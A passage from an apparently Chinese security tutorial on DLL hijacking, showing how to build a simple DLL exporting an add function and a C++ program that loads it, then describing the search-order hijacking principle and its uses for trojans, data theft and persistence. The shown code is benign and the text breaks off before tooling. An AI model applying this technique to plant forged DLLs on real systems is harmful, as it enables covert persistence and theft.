rgb(255, 255, 255);">鼠标右键新建一个 shiyan_dl.h 头文件，填入如下代码：</span></span></p><figure class="highlight c++" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="720" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">2</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">3</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">4</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">5</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">6</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">7</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">8</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">#pragma once</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#ifndef LIB_H</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#define LIB_H</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(147, 161, 161);font-style: italic;">// 这种声明方式是强制用c语言方式进行修饰，且用C的默认约定__cdecl方式。</span></span><br  /><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">// 这种方式编译产生的DLL中有一个导出函数：add，不加任何修饰。</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">extern</span> <span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">"C"</span> <span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> __declspec(dllexport)add(<span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> x, <span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> y);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#endif</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">5、这个时候，点击 生成→生成解决方案 ，然后我们的DLL函数就好了。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">6、然后我们进入到 shiyan_dll\Debug 目录，即可看到我们生成好的dll文件。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.37252619324796277" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/3_Px91k6ej11dGmleaeH50U8ouGoroFA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4lfqAX394zb9X1CKn8bcpWMOWPx91k6ej11dGmleaeH50U8ouGoroFA/640?wx_fmt=png'" data-type="png" data-w="859" style="border-width: 0px;border-style: initial;border-color: initial;display: block;margin: 1rem auto;"  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x04 加载使用我们的DLL文件</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">IDE：</span><span style="font-size:15px;line-height:35px;;">vs2017</span></p><p><span style="font-size:15px;line-height:35px;;">语言：</span><span style="font-size:15px;line-height:35px;;">C\C++</span></p><blockquote><p>加载DLL写法不止下面我用的这个写法，还有其它嵌套写法，但是其它写法，能不能被劫持就又是另一回事了。</p></blockquote><p><span style="font-size:15px;line-height:35px;;">1、进入一个文件夹目录，鼠标右键，用 “在 Visual Studio 中打开（V）” ，打开。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">2、然后 文件→新建→项目→[已安装 &gt; Visual C++ &gt; Windows桌面]→Windows 控制台应用程序，生成一个cpp文件。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">这里我命名为 shiyan_c++</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.61875" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/4_Y6fDvOLUGc4kWM8w0xndobIRNXE4OQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4FAYZZaXiaFwIBvCLxcjI0umPJY6fDvOLUGc4kWM8w0xndobIRNXE4OQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">3、然后我们填入以下代码：</span><span style="font-size:15px;line-height:35px;;"></span></p><figure class="highlight c++" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="1208" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">2</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">3</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">4</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">5</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">6</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">7</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">8</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">9</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">10</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">11</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">12</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">13</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">14</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">15</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">16</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">17</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">18</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">19</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">20</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">21</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">22</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">23</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">24</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">25</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">26</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">27</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">28</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">29</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">30</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">31</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">32</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">33</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">34</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">35</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">// shiyan_c++.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。</span><br  /><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">//</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;">#include "stdafx.h"</span></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#include "stdio.h"</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#include "windows.h"</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#include &lt;tchar.h&gt;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">#include &lt;stdlib.h&gt;</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"><span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">typedef</span> <span class="title" style="font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">int</span>(*lpAddFun)(<span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span>, <span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span>); <span class="comment" style="font-size:15px;line-height:35px;;color: rgb(147, 161, 161);font-style: italic;">// 函数声明 lpAddFun是一个指向函数的指针，该函数有两个参数都是int类型，函数的返回值也是int类型</span></span></span><br  /><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">// int *function(int,int)表示函数的两个参数都是int类型，函数的返回值是指向Int类型的指针；</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"><span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> _tmain(<span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> argc, _TCHAR* argv[])</span></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">	HINSTANCE hDll; <span class="comment" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(147, 161, 161);font-style: italic;">// DLL句柄</span></span><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;"></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">	lpAddFun addFun; <span class="comment" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(147, 161, 161);font-style: italic;">// 函数指针</span></span><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;"></span><br  /><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">//TCHAR tzPath[MAX_PATH];</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;">	hDll = LoadLibraryW(<span class="string" style="font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">L"shiyan_dll.dll"</span>);<span class="comment" style="font-size:15px;line-height:35px;;color: rgb(147, 161, 161);font-style: italic;">// 如果不加L会报错 “LoadLibraryW”: 不能将参数 1 从“const char [16]”转换为“LPCWSTR”</span></span></span><br  /><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">//与指向的类型无关；转换要求 reinterpret_cast、C 样式转换或函数样式转换</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (hDll != <span class="literal" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">NULL</span>)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">	{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">		addFun = (lpAddFun)GetProcAddress(hDll, <span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">"add"</span>);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">if</span> (addFun != <span class="literal" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">NULL</span>)</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">		{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> result = addFun(<span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">1300</span>, <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">14</span>);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="built_in" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">printf</span>(<span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">"%d\n"</span>, result);</span><br  /><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">//GetSystemDirectory(tzPath,MAX_PATH); //得到系统目录……没用啊……这是谁写的程序</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">		}</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">		FreeLibrary(hDll);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">	}</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">	system(<span class="string" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">"pause"</span>);</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">return</span> <span class="number" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(42, 161, 152);">0</span>;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">}</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">4、然后把一开始在shiyan_dll 项目目录下的 targetver.h、stdafx.h、stdafx.cpp 三个文件复制到 shiyan_c++ 项目目录下。</span><span style="font-size:15px;line-height:35px;;">并且添加到相应的头文件和源文件分类下（不添加的话，会无法生成文件）。</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.4965197215777262" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/5_aBEgYwnn7tQBtCb0CK4ibKjGIhbJXw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4DeIs6UhqSTMUhA2lD8XhDIYDDiaBEgYwnn7tQBtCb0CK4ibKjGIhbJXw/640?wx_fmt=png'" data-type="png" data-w="862" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">5、因为vs2017的IDE的原因，会有个pch.cpp、pch.h，在实际运用中，我们是不需要的，所以需要去除掉。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">6、点击 项目→shiyan_c++属性→C\C++→预编译头→选择不适用预编译头，然后选择应用，确认。</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.59375" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/6_ypeT7oaLybJRRfibv3ibASH0PomfhQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4iceYw4qMWIjxiaJegvOHqncyeSQDypeT7oaLybJRRfibv3ibASH0PomfhQ/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">7、这个时候，点击 生成→生成解决方案 ，然后我们的加载DLL函数的exe文件就好了。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">8、然后我们把刚才生成好的dll文件和exe文件放到同一个目录中，并执行exe就能看到效果。</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.2787286063569682" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/7_icmUx0H6THiax6AEMWmYDQYRqjI7Wg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4GrYOAUaicmic9DuVqGSFVQTZQ1U7icmUx0H6THiax6AEMWmYDQYRqjI7Wg/640?wx_fmt=png'" data-type="png" data-w="818" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.4325980392156863" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/8_Yko7xc4EjhF6oCWAg0W9S1d0icaPqA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4baAibTr0yuWibWvQMibhp0TB90uKYko7xc4EjhF6oCWAg0W9S1d0icaPqA/640?wx_fmt=png'" data-type="png" data-w="816" style="border-width: 0px;border-style: initial;border-color: initial;display: block;margin: 1rem auto;"  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x05 DLL劫持的作用</strong></span></p><ol style="" class=" list-paddingleft-2"><li><p><span style="font-size:15px;line-height:35px;;">病毒传播</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">盗号木马</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">隐私信息收集</span></p></li></ol><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">当然对于APT爱好者来说，DLL劫持最大作用，其实是权限维持！</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">水坑，钓鱼的话，也是可以利用的。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x06 DLL劫持的原理</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">通过前面介绍，我们可以看出，程序加载一个DLL时，是除了注册表固定好的绝对位置后，还会按顺序目录进行查找，如果我们提前伪造一个DLL文件，并且放置在加载以前的目录中，提前加载我们的DLL，从而达到一个劫持的效果。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">当然除了提前劫持这个一说，如果权限可以的话，我可以直接重构这个DLL文件，直接覆盖，或者变相应用，毕竟我们的重点是权限维持。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x07 查找可能存在劫持的DLL</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro 